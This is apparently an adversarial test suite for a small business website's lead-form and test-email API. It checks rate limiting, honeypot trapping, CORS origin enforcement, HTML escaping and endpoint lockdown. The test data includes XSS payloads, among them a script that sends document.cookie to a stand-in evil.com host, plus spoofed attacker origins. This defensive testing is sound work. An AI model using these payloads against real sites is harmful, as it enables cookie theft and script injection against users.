#!/usr/bin/env node
/**
 * Empirical Adversarial Attack & Stress Suite
 * Challenger: teamwork_challenger_sec_1
 * 
 * Vectors Tested:
 * 1. Rate Limiting on /api/lead (5 requests / 10min per IP -> 6th returns 429 & Retry-After; IP isolation; proxy headers)
 * 2. Honeypot Trap (b_url & honeypot fields -> 200 silent, zero disk writes, zero email dispatch, PII log redaction)
 * 3. CORS / Origin Enforcement (Strict origin allowlist, subdomains, localhost dev vs prod, OPTIONS preflight, Referer checks)
 * 4. HTML Escaping & Sanitization (XSS vectors in lead storage, length truncations, email HTML template injection)
 * 5. Lockdown of /api/test-email (404 in production, 405 on non-POST, elimination of ?to= open relay, zero credential leakage)
 */

import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const rootDir = path.resolve(__dirname, '..');

const jiti = require('jiti')(__dirname);

// Load target implementations
const leadModule = jiti('../pages/api/lead.ts');
const leadHandler = leadModule.default;
const { _resetRateLimitStore, escapeHtml, sanitizeText } = leadModule;

const testEmailModule = jiti('../pages/api/test-email.ts');
const testEmailHandler = testEmailModule.default;

const emailModule = jiti('../lib/email.ts');
const { buildLeadNotificationHtml, buildLeadNotificationPlainText } = emailModule;

console.log('========================================================================');
console.log('  CHALLENGER 1: EMPIRICAL ADVERSARIAL ATTACK & HARDENING SUITE          ');
console.log('========================================================================\n');

let totalProbes = 0;
let passedProbes = 0;
let failedProbes = 0;

function mockRes() {
  const headers = {};
  const res = {
    statusCode: 200,
    headers,
    setHeader(name, val) {
      headers[name.toLowerCase()] = val;
    },
    status(code) {
      this.statusCode = code;
      return this;
    },
    json(body) {
      this.body = body;
      return this;
    },
    end() {
      this.ended = true;
      return this;
    },
  };
  return res;
}

async function runProbe(id, description, testFn) {
  totalProbes++;
  try {
    await testFn();
    passedProbes++;
    console.log(`  ✔ [PASS] [${id}] ${description}`);
  } catch (err) {
    failedProbes++;
    console.error(`  ✖ [FAIL] [${id}] ${description}`);
    console.error(`     Reason: ${err.message}`);
    if (err.stack) {
      const relevantStack = err.stack.split('\n').slice(1, 4).join('\n');
      console.error(`     Stack:\n${relevantStack}`);
    }
  }
}

// =============================================================================
// VECTOR 1: RATE LIMITING ATTACKS ON /api/lead
// =============================================================================
console.log('\n--- VECTOR 1: RATE LIMITING ATTACKS ON /api/lead ---');

await runProbe('PROBE-1.1', '5 consecutive requests from single IP succeed with HTTP 200', async () => {
  _resetRateLimitStore();
  const testIp = '198.51.100.42';

  for (let i = 1; i <= 5; i++) {
    const req = {
      method: 'POST',
      headers: {
        'x-forwarded-for': testIp,
        'content-type': 'application/json',
      },
      body: {
        name: `Valid Client ${i}`,
        phone: '+421908403042',
        b_url: '',
      },
      socket: { remoteAddress: testIp },
    };
    const res = mockRes();
    await leadHandler(req, res);
    assert.strictEqual(res.statusCode, 200, `Request ${i} should return 200, got ${res.statusCode}`);
    assert.strictEqual(res.body.success, true);
  }
});

await runProbe('PROBE-1.2', '6th request from same IP is blocked with HTTP 429 and Retry-After header', async () => {
  const testIp = '198.51.100.42';
  const req6 = {
    method: 'POST',
    headers: {
      'x-forwarded-for': testIp,
      'content-type': 'application/json',
    },
    body: {
      name: 'Spammer Request 6',
      phone: '+421908403042',
      b_url: '',
    },
    socket: { remoteAddress: testIp },
  };
  const res6 = mockRes();
  await leadHandler(req6, res6);

  assert.strictEqual(res6.statusCode, 429, `6th request must be rejected with HTTP 429, got ${res6.statusCode}`);
  assert.strictEqual(res6.body.success, false, 'Body must have success: false');
  assert(res6.body.message.includes('Príliš veľa požiadaviek'), 'Informative rate limit message expected');
  assert(res6.headers['retry-after'], 'Retry-After header must be set');
  const retrySec = parseInt(res6.headers['retry-after'], 10);
  assert(!isNaN(retrySec) && retrySec > 0 && retrySec <= 600, `Retry-After must be between 1 and 600s, got ${retrySec}`);
});

await runProbe('PROBE-1.3', '7th and 8th rapid requests continue to be rejected with HTTP 429', async () => {
  const testIp = '198.51.100.42';
  for (let attempt = 7; attempt <= 8; attempt++) {
    const req = {
      method: 'POST',
      headers: {
        'x-forwarded-for': testIp,
        'content-type': 'application/json',
      },
      body: {
        name: `Rapid Attack ${attempt}`,
        phone: '+421908403042',
      },
      socket: { remoteAddress: testIp },
    };
    const res = mockRes();
    await leadHandler(req, res);
    assert.strictEqual(res.statusCode, 429, `Attempt ${attempt} must receive 429, got ${res.statusCode}`);
  }
});

await runProbe('PROBE-1.4', 'IP isolation: Independent client IP is NOT blocked by anothers rate exhaustion', async () => {
  const freshIp = '203.0.113.88';
  const req = {
    method: 'POST',
    headers: {
      'x-forwarded-for': freshIp,
      'content-type': 'application/json',
    },
    body: {
      name: 'Legitimate Independent User',
      phone: '+421908403042',
      b_url: '',
    },
    socket: { remoteAddress: freshIp },
  };
  const res = mockRes();
  await leadHandler(req, res);
  assert.strictEqual(res.statusCode, 200, `Fresh IP must return 200, got ${res.statusCode}`);
  assert.strictEqual(res.body.success, true);
});

await runProbe('PROBE-1.5', 'X-Forwarded-For proxy chain parsing correctly extracts initial client IP', async () => {
  // Attacker attempts to forge proxy chain: "198.51.100.42, 10.0.0.1, 127.0.0.1"
  // Since 198.51.100.42 is already rate limited, this request must still return 429!
  const req = {
    method: 'POST',
    headers: {
      'x-forwarded-for': '198.51.100.42, 10.0.0.1, 127.0.0.1',
      'content-type': 'application/json',
    },
    body: {
      name: 'Proxy Chain Attacker',
      phone: '+421908403042',
    },
    socket: { remoteAddress: '10.0.0.1' },
  };
  const res = mockRes();
  await leadHandler(req, res);
  assert.strictEqual(res.statusCode, 429, 'Spoofed proxy chain must still bind to client IP 198.51.100.42 and be 429');
});

// =============================================================================
// VECTOR 2: HONEYPOT TRAP & PRIVACY PRESERVATION
// =============================================================================
console.log('\n--- VECTOR 2: HONEYPOT TRAP & PRIVACY PRESERVATION ---');

await runProbe('PROBE-2.1', 'Populated b_url honeypot returns silent HTTP 200 with BOT-TRAP leadId', async () => {
  _resetRateLimitStore();
  const req = {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: {
      name: 'Aggressive Scraping Bot',
      phone: '+421908403042',
      b_url: 'http://malicious-spam-url.com/tracker',
    },
    socket: { remoteAddress: '198.51.100.99' },
  };
  const res = mockRes();
  await leadHandler(req, res);

  assert.strictEqual(res.statusCode, 200, 'Honeypot must silently return HTTP 200');
  assert.strictEqual(res.body.success, true);
  assert(res.body.leadId && res.body.leadId.startsWith('BOT-TRAP-'), 'LeadId must start with BOT-TRAP-');
});

await runProbe('PROBE-2.2', 'Alternate honeypot field name is equally trapped', async () => {
  const req = {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: {
      name: 'Bot Using honeypot attribute',
      phone: '+421908403042',
      honeypot: 'filled-by-crawler',
    },
    socket: { remoteAddress: '198.51.100.99' },
  };
  const res = mockRes();
  await leadHandler(req, res);

  assert.strictEqual(res.statusCode, 200);
  assert.strictEqual(res.body.success, true);
  assert(res.body.leadId && res.body.leadId.startsWith('BOT-TRAP-'));
});

await runProbe('PROBE-2.3', 'Honeypot trap leads are NEVER persisted to data/leads.json', async () => {
  const leadsPath = path.join(rootDir, 'data', 'leads.json');
  const countBefore = fs.existsSync(leadsPath) ? JSON.parse(fs.readFileSync(leadsPath, 'utf8')).length : 0;

  const req = {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: {
      name: 'Zero Persistence Bot',
      phone: '+421908403042',
      b_url: 'https://should-not-be-in-leads-file.org',
    },
    socket: { remoteAddress: '198.51.100.99' },
  };
  const res = mockRes();
  await leadHandler(req, res);

  const countAfter = fs.existsSync(leadsPath) ? JSON.parse(fs.readFileSync(leadsPath, 'utf8')).length : 0;
  assert.strictEqual(countAfter, countBefore, 'leads.json length must NOT increase for honeypot submissions');

  if (fs.existsSync(leadsPath)) {
    const rawContent = fs.readFileSync(leadsPath, 'utf8');
    assert(!rawContent.includes('Zero Persistence Bot'), 'Bot name must not appear in leads.json');
    assert(!rawContent.includes('should-not-be-in-leads-file.org'), 'Honeypot value must not appear in leads.json');
  }
});

await runProbe('PROBE-2.4', 'GDPR Art. 32: Raw honeypot botField value is NEVER logged to console', async () => {
  const secretPiiToken = 'CONFIDENTIAL-PASSPORT-SK-8837194';
  const interceptedLogs = [];

  const originalWarn = console.warn;
  const originalLog = console.log;
  const originalError = console.error;

  console.warn = (...args) => interceptedLogs.push(JSON.stringify(args));
  console.log = (...args) => interceptedLogs.push(JSON.stringify(args));
  console.error = (...args) => interceptedLogs.push(JSON.stringify(args));

  try {
    const req = {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: {
        name: 'Browser Autofill Accidental Victim',
        phone: '+421908403042',
        b_url: secretPiiToken,
      },
      socket: { remoteAddress: '198.51.100.99' },
    };
    const res = mockRes();
    await leadHandler(req, res);
  } finally {
    console.warn = originalWarn;
    console.log = originalLog;
    console.error = originalError;
  }

  const allLoggedText = interceptedLogs.join(' ');
  assert(!allLoggedText.includes(secretPiiToken), `CRITICAL GDPR VIOLATION: Honeypot raw value was logged! Found in logs: ${allLoggedText}`);
});

await runProbe('PROBE-2.5', 'Whitespace-only in honeypot is treated as empty (legitimate lead is processed)', async () => {
  _resetRateLimitStore();
  const req = {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: {
      name: 'Legitimate Whitespace User',
      phone: '+421908403042',
      b_url: '   ',
    },
    socket: { remoteAddress: '198.51.100.12' },
  };
  const res = mockRes();
  await leadHandler(req, res);
  assert.strictEqual(res.statusCode, 200);
  assert(res.body.leadId && res.body.leadId.startsWith('LEAD-'), `Expected regular LEAD- ID, got ${res.body.leadId}`);
});

// =============================================================================
// VECTOR 3: CORS & ORIGIN ENFORCEMENT
// =============================================================================
console.log('\n--- VECTOR 3: CORS & ORIGIN ENFORCEMENT ---');

await runProbe('PROBE-3.1', 'Unauthorized Origin is blocked with HTTP 403 Forbidden', async () => {
  const req = {
    method: 'POST',
    headers: {
      origin: 'https://evil-phishing-attacker.com',
      'content-type': 'application/json',
    },
    body: { name: 'Attacker', phone: '+421908403042' },
    socket: { remoteAddress: '198.51.100.15' },
  };
  const res = mockRes();
  await leadHandler(req, res);

  assert.strictEqual(res.statusCode, 403, `Untrusted origin must return HTTP 403, got ${res.statusCode}`);
  assert.strictEqual(res.body.success, false);
});

await runProbe('PROBE-3.2', 'Prefix and subdomain spoofing attempts are rejected with HTTP 403', async () => {
  const spoofOrigins = [
    'https://marvol.sk.attacker.com',
    'https://attacker-marvol.sk',
    'https://www.marvol.sk.evil.com',
    'http://marvol.sk', // HTTP instead of HTTPS
  ];

  for (const spoof of spoofOrigins) {
    const req = {
      method: 'POST',
      headers: {
        origin: spoof,
        'content-type': 'application/json',
      },
      body: { name: 'Attacker', phone: '+421908403042' },
      socket: { remoteAddress: '198.51.100.16' },
    };
    const res = mockRes();
    await leadHandler(req, res);
    assert.strictEqual(res.statusCode, 403, `Spoofed origin ${spoof} must be rejected with 403, got ${res.statusCode}`);
  }
});

await runProbe('PROBE-3.3', 'Authorized origin https://marvol.sk is accepted with proper CORS headers', async () => {
  _resetRateLimitStore();
  const req = {
    method: 'POST',
    headers: {
      origin: 'https://marvol.sk',
      'content-type': 'application/json',
    },
    body: { name: 'Zákazník z Marvolu', phone: '+421908403042' },
    socket: { remoteAddress: '198.51.100.17' },
  };
  const res = mockRes();
  await leadHandler(req, res);

  assert.strictEqual(res.statusCode, 200);
  assert.strictEqual(res.headers['access-control-allow-origin'], 'https://marvol.sk');
});

await runProbe('PROBE-3.4', 'Authorized origin https://www.marvol.sk is accepted with proper CORS headers', async () => {
  const req = {
    method: 'POST',
    headers: {
      origin: 'https://www.marvol.sk',
      'content-type': 'application/json',
    },
    body: { name: 'Zákazník z WWW Marvolu', phone: '+421908403042' },
    socket: { remoteAddress: '198.51.100.18' },
  };
  const res = mockRes();
  await leadHandler(req, res);

  assert.strictEqual(res.statusCode, 200);
  assert.strictEqual(res.headers['access-control-allow-origin'], 'https://www.marvol.sk');
});

await runProbe('PROBE-3.5', 'In NODE_ENV=production, localhost origins are STRICTLY FORBIDDEN', async () => {
  const prevEnv = process.env.NODE_ENV;
  try {
    process.env.NODE_ENV = 'production';
    const req = {
      method: 'POST',
      headers: {
        origin: 'http://localhost:3000',
        'content-type': 'application/json',
      },
      body: { name: 'Localhost In Production', phone: '+421908403042' },
      socket: { remoteAddress: '127.0.0.1' },
    };
    const res = mockRes();
    await leadHandler(req, res);
    assert.strictEqual(res.statusCode, 403, `In production, localhost origin must be rejected with 403, got ${res.statusCode}`);
  } finally {
    process.env.NODE_ENV = prevEnv;
  }
});

await runProbe('PROBE-3.6', 'CORS preflight OPTIONS for untrusted origin returns HTTP 403', async () => {
  const req = {
    method: 'OPTIONS',
    headers: { origin: 'https://untrusted-site.com' },
    socket: { remoteAddress: '198.51.100.19' },
  };
  const res = mockRes();
  await leadHandler(req, res);
  assert.strictEqual(res.statusCode, 403, `Untrusted preflight OPTIONS must return 403, got ${res.statusCode}`);
});

await runProbe('PROBE-3.7', 'CORS preflight OPTIONS for trusted origin returns HTTP 204 with methods and headers', async () => {
  const req = {
    method: 'OPTIONS',
    headers: { origin: 'https://marvol.sk' },
    socket: { remoteAddress: '198.51.100.20' },
  };
  const res = mockRes();
  await leadHandler(req, res);
  assert.strictEqual(res.statusCode, 204, `Trusted preflight OPTIONS must return 204, got ${res.statusCode}`);
  assert.strictEqual(res.headers['access-control-allow-origin'], 'https://marvol.sk');
  assert(res.headers['access-control-allow-methods'].includes('POST'));
  assert(res.headers['access-control-max-age'], 'Must set Max-Age');
});

// =============================================================================
// VECTOR 4: HTML ESCAPING, SANITIZATION & INJECTION ATTACKS
// =============================================================================
console.log('\n--- VECTOR 4: HTML ESCAPING & SANITIZATION ---');

await runProbe('PROBE-4.1', 'Stored XSS vectors in /api/lead are sanitized to HTML entities in leads.json', async () => {
  _resetRateLimitStore();
  const xssName = '<script>alert("XSS")</script>';
  const xssMessage = 'Check this: <img src=x onerror=alert(1)> & "double quote" \'single quote\'';
  const xssCity = '<b onmouseover="alert(1)">Bratislava</b>';
  const xssService = '<svg onload=alert(document.domain)>';
  const xssSource = '<a href="javascript:void(0)">banner</a>';

  const req = {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: {
      name: xssName,
      phone: '+421908403042',
      message: xssMessage,
      city: xssCity,
      service: xssService,
      source: xssSource,
      b_url: '',
    },
    socket: { remoteAddress: '198.51.100.21' },
  };
  const res = mockRes();
  await leadHandler(req, res);

  assert.strictEqual(res.statusCode, 200);

  const leadsPath = path.join(rootDir, 'data', 'leads.json');
  const leads = JSON.parse(fs.readFileSync(leadsPath, 'utf8'));
  const stored = leads.find((l) => l.id === res.body.leadId);
  assert(stored, 'Stored lead must exist in data/leads.json');

  // Verify full entity escaping
  assert.strictEqual(stored.name, '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
  assert(!stored.name.includes('<script>'));
  assert(!stored.city.includes('<b '));
  assert(stored.city.includes('&lt;b '));
  assert(!stored.service.includes('<svg'));
  assert(stored.service.includes('&lt;svg'));
  assert(!stored.source.includes('<a '));
  assert(stored.source.includes('&lt;a '));
  assert(stored.message.includes('&lt;img'));
  assert(stored.message.includes('&amp;'));
  assert(stored.message.includes('&quot;'));
  assert(stored.message.includes('&#39;'));
});

await runProbe('PROBE-4.2', 'Email template buildLeadNotificationHtml neutralizes HTML injection in all fields', async () => {
  const xssLead = {
    id: 'LEAD-ATTACK-001',
    timestamp: new Date().toISOString(),
    name: '<script>alert("XSS")</script>',
    phone: '+421 908 403 042',
    email: 'hacker"onfocus="alert(1)"@example.com',
    city: '<iframe src="http://evil.com"></iframe>',
    service: '<div style="position:fixed;width:100%;height:100%;background:red"></div>',
    source: '<form action="http://evil.com/steal"><button>Click</button></form>',
    message: '<script>fetch("http://evil.com/steal?"+document.cookie)</script>',
  };

  const html = buildLeadNotificationHtml(xssLead);

  // Assert NO executable script, iframe, div hijacking or form action exists
  assert(!html.includes('<script>'), 'Unescaped script must not exist in email HTML');
  assert(!html.includes('<iframe'), 'Unescaped iframe must not exist in email HTML');
  assert(!html.includes('<div style="position:fixed'), 'Unescaped div overlay must not exist in email HTML');
  assert(!html.includes('<form action='), 'Unescaped form action must not exist in email HTML');

  // Assert entity encoding is present
  assert(html.includes('&lt;script&gt;'));
  assert(html.includes('&lt;iframe'));
  assert(html.includes('&lt;div style='));
  assert(html.includes('&lt;form action='));
});

await runProbe('PROBE-4.3', 'sanitizeText enforces strict character length truncation preventing memory bomb', () => {
  const giantInput = 'A'.repeat(50000);
  const sanitized = sanitizeText(giantInput, 100);
  assert.strictEqual(sanitized.length, 100, `Sanitized string should be truncated to 100 chars, got ${sanitized.length}`);
  assert.strictEqual(sanitizeText(null, 50), '');
  assert.strictEqual(sanitizeText(undefined, 50), '');
  assert.strictEqual(sanitizeText(12345, 50), '');
});

// =============================================================================
// VECTOR 5: LOCKDOWN OF /api/test-email
// =============================================================================
console.log('\n--- VECTOR 5: LOCKDOWN OF /api/test-email ---');

await runProbe('PROBE-5.1', 'In NODE_ENV=production, POST to /api/test-email returns HTTP 404 Not Found', async () => {
  const prevEnv = process.env.NODE_ENV;
  try {
    process.env.NODE_ENV = 'production';
    const req = {
      method: 'POST',
      query: {},
      socket: { remoteAddress: '127.0.0.1' },
    };
    const res = mockRes();
    await testEmailHandler(req, res);

    assert.strictEqual(res.statusCode, 404, `Must return 404 in production, got ${res.statusCode}`);
    assert.strictEqual(res.body.success, false);
    assert(res.body.message.includes('nie je v produkčnom prostredí dostupný'));
  } finally {
    process.env.NODE_ENV = prevEnv;
  }
});

await runProbe('PROBE-5.2', 'In NODE_ENV=production, GET to /api/test-email also returns HTTP 404', async () => {
  const prevEnv = process.env.NODE_ENV;
  try {
    process.env.NODE_ENV = 'production';
    const req = {
      method: 'GET',
      query: {},
      socket: { remoteAddress: '127.0.0.1' },
    };
    const res = mockRes();
    await testEmailHandler(req, res);

    assert.strictEqual(res.statusCode, 404, `Must return 404 in production on GET, got ${res.statusCode}`);
    assert.strictEqual(res.body.success, false);
  } finally {
    process.env.NODE_ENV = prevEnv;
  }
});

await runProbe('PROBE-5.3', 'In development, non-POST methods (GET, PUT, DELETE) return HTTP 405 Method Not Allowed', async () => {
  const prevEnv = process.env.NODE_ENV;
  try {
    process.env.NODE_ENV = 'development';
    for (const method of ['GET', 'PUT', 'DELETE']) {
      const req = {
        method,
        query: {},
        socket: { remoteAddress: '127.0.0.1' },
      };
      const res = mockRes();
      await testEmailHandler(req, res);

      assert.strictEqual(res.statusCode, 405, `${method} must return 405, got ${res.statusCode}`);
      const allowHeader = res.headers['allow'];
      const allowsPost = Array.isArray(allowHeader) ? allowHeader.includes('POST') : allowHeader === 'POST';
      assert(allowsPost, 'Allow header must include POST');
    }
  } finally {
    process.env.NODE_ENV = prevEnv;
  }
});

await runProbe('PROBE-5.4', 'Open relay prevention: Arbitrary ?to= query parameter is completely ignored', async () => {
  const prevEnv = process.env.NODE_ENV;
  try {
    process.env.NODE_ENV = 'development';
    const fileSource = fs.readFileSync(path.join(rootDir, 'pages/api/test-email.ts'), 'utf8');
    assert(!fileSource.includes('req.query.to'), 'CRITICAL: req.query.to was found in source code!');
    assert(!fileSource.includes('req.body.to'), 'CRITICAL: req.body.to was found in source code!');

    const req = {
      method: 'POST',
      query: { to: 'victim@external-phishing-target.com' },
      body: { to: 'victim@external-phishing-target.com' },
      socket: { remoteAddress: '127.0.0.1' },
    };
    const res = mockRes();
    await testEmailHandler(req, res);

    if (res.body?.message) {
      assert(!res.body.message.includes('victim@external-phishing-target.com'), 'Must never dispatch or reference open relay recipient');
    }
  } finally {
    process.env.NODE_ENV = prevEnv;
  }
});

await runProbe('PROBE-5.5', 'Zero credential or secret disclosure in unconfigured/failure state', async () => {
  const prevEnv = process.env.NODE_ENV;
  const prevKey = process.env.RESEND_API_KEY;
  const prevSmtpPass = process.env.SMTP_PASS;
  try {
    process.env.NODE_ENV = 'development';
    delete process.env.RESEND_API_KEY;
    delete process.env.SMTP_PASS;

    const req = {
      method: 'POST',
      query: {},
      socket: { remoteAddress: '127.0.0.1' },
    };
    const res = mockRes();
    await testEmailHandler(req, res);

    assert.strictEqual(res.statusCode, 200);
    assert.strictEqual(res.body.success, false);
    const bodyStr = JSON.stringify(res.body);
    assert(!bodyStr.includes('re_'), 'No Resend API key fragments should be leaked');
    assert(!bodyStr.includes('password'), 'No password strings should be leaked');
  } finally {
    process.env.NODE_ENV = prevEnv;
    if (prevKey) process.env.RESEND_API_KEY = prevKey;
    if (prevSmtpPass) process.env.SMTP_PASS = prevSmtpPass;
  }
});

// =============================================================================
// VECTOR 6: ADVANCED ADVERSARIAL STRESS & CORNER CASES
// =============================================================================
console.log('\n--- VECTOR 6: ADVANCED ADVERSARIAL STRESS & CORNER CASES ---');

await runProbe('PROBE-6.1', 'Concurrent burst attack: 20 simultaneous requests from single IP result in exactly 5 allowed, 15 blocked', async () => {
  _resetRateLimitStore();
  const burstIp = '198.51.100.77';

  const promises = [];
  for (let i = 0; i < 20; i++) {
    const req = {
      method: 'POST',
      headers: {
        'x-forwarded-for': burstIp,
        'content-type': 'application/json',
      },
      body: {
        name: `Burst Client ${i}`,
        phone: '+421908403042',
        b_url: '',
      },
      socket: { remoteAddress: burstIp },
    };
    const res = mockRes();
    promises.push(leadHandler(req, res).then(() => res.statusCode));
  }

  const results = await Promise.all(promises);
  const count200 = results.filter((code) => code === 200).length;
  const count429 = results.filter((code) => code === 429).length;

  assert.strictEqual(count200, 5, `Expected exactly 5 allowed (200), got ${count200}`);
  assert.strictEqual(count429, 15, `Expected exactly 15 blocked (429), got ${count429}`);
});

await runProbe('PROBE-6.2', 'Corrupted / missing IP headers fallback safely to socket remoteAddress or 127.0.0.1 without throwing', async () => {
  _resetRateLimitStore();
  const corruptHeaders = [
    { 'x-forwarded-for': '' },
    { 'x-forwarded-for': '   ' },
    { 'x-forwarded-for': undefined },
  ];

  for (const headers of corruptHeaders) {
    const req = {
      method: 'POST',
      headers: { ...headers, 'content-type': 'application/json' },
      body: { name: 'Fallback User', phone: '+421908403042' },
      socket: {},
    };
    const res = mockRes();
    await leadHandler(req, res);
    assert.strictEqual(res.statusCode, 200, 'Should fall back gracefully and succeed');
  }
});

await runProbe('PROBE-6.3', 'HTTP method fuzzing on /api/lead: PUT, DELETE, PATCH, HEAD return 405', async () => {
  for (const method of ['PUT', 'DELETE', 'PATCH', 'HEAD']) {
    const req = {
      method,
      headers: {},
      socket: { remoteAddress: '127.0.0.1' },
    };
    const res = mockRes();
    await leadHandler(req, res);
    assert.strictEqual(res.statusCode, 405, `${method} must return 405, got ${res.statusCode}`);
  }
});

await runProbe('PROBE-6.4', 'Honeypot fuzzing with arrays/numbers does not crash server and triggers trap', async () => {
  const strangeBotInputs = [
    { b_url: ['bot', 'array'] },
    { b_url: 123456 },
    { honeypot: 99999 },
  ];

  for (const extra of strangeBotInputs) {
    const req = {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: {
        name: 'Bot with weird types',
        phone: '+421908403042',
        ...extra,
      },
      socket: { remoteAddress: '198.51.100.99' },
    };
    const res = mockRes();
    await leadHandler(req, res);
    assert.strictEqual(res.statusCode, 200);
    assert(res.body.leadId && res.body.leadId.startsWith('BOT-TRAP-'), 'Must trap weird honeypot values');
  }
});

await runProbe('PROBE-6.5', 'CORS origin "null" (sandboxed iframe / data URI) is rejected with HTTP 403', async () => {
  const req = {
    method: 'POST',
    headers: {
      origin: 'null',
      'content-type': 'application/json',
    },
    body: { name: 'Sandboxed Iframe Attacker', phone: '+421908403042' },
    socket: { remoteAddress: '198.51.100.33' },
  };
  const res = mockRes();
  await leadHandler(req, res);
  assert.strictEqual(res.statusCode, 403, 'origin "null" must be rejected with 403');
});

await runProbe('PROBE-6.6', 'ReDoS resistance: 10,000-character malicious inputs are rejected in < 50ms', async () => {
  _resetRateLimitStore();
  const evilPhone = '+421' + '9'.repeat(10000) + '!';
  const evilEmail = 'a'.repeat(5000) + '@' + 'b'.repeat(5000) + '.com!';

  const startPhone = Date.now();
  const reqPhone = {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: { name: 'ReDoS Attacker', phone: evilPhone },
    socket: { remoteAddress: '198.51.100.44' },
  };
  const resPhone = mockRes();
  await leadHandler(reqPhone, resPhone);
  const durationPhone = Date.now() - startPhone;

  assert.strictEqual(resPhone.statusCode, 400);
  assert(durationPhone < 50, `Phone validation took too long: ${durationPhone}ms`);

  const startEmail = Date.now();
  const reqEmail = {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: { name: 'ReDoS Attacker', phone: '+421908403042', email: evilEmail },
    socket: { remoteAddress: '198.51.100.44' },
  };
  const resEmail = mockRes();
  await leadHandler(reqEmail, resEmail);
  const durationEmail = Date.now() - startEmail;

  assert.strictEqual(resEmail.statusCode, 400);
  assert(durationEmail < 50, `Email validation took too long: ${durationEmail}ms`);
});

await runProbe('PROBE-6.7', 'Comprehensive XSS evasion vectors are all neutralized by escapeHtml', () => {
  const vectors = [
    '<IMG SRC="jav&#x0A;ascript:alert(1);">',
    '<BODY ONLOAD=alert("XSS")>',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<SCRIPT SRC=http://evil.com/xss.js?< B >',
    '<div onfocus="alert(1)" autofocus>',
    '"><script>alert(1)</script>',
    '\'><script>alert(1)</script>',
  ];

  for (const v of vectors) {
    const escaped = escapeHtml(v);
    assert(!escaped.includes('<'), `Vector failed to escape <: ${v}`);
    assert(!escaped.includes('>'), `Vector failed to escape >: ${v}`);
    assert(!escaped.includes('"') || escaped.includes('&quot;'), `Vector failed to escape ": ${v}`);
    assert(!escaped.includes('\'') || escaped.includes('&#39;'), `Vector failed to escape ': ${v}`);
  }
});

// =============================================================================
// SUMMARY
// =============================================================================
console.log('\n========================================================================');
console.log(`  TOTAL ATTACK PROBES : ${totalProbes}`);
console.log(`  PASSED              : ${passedProbes}`);
console.log(`  FAILED              : ${failedProbes}`);
console.log('========================================================================\n');

if (failedProbes === 0) {
  console.log(`>>> VERDICT: ALL ${totalProbes} EMPIRICAL ATTACK PROBES CONFIRMED SECURE (APPROVE) <<<\n`);
  process.exit(0);
} else {
  console.error(`>>> VERDICT: ${failedProbes} ATTACK PROBE(S) FAILED (REQUEST_CHANGES) <<<\n`);
  process.exit(1);
}

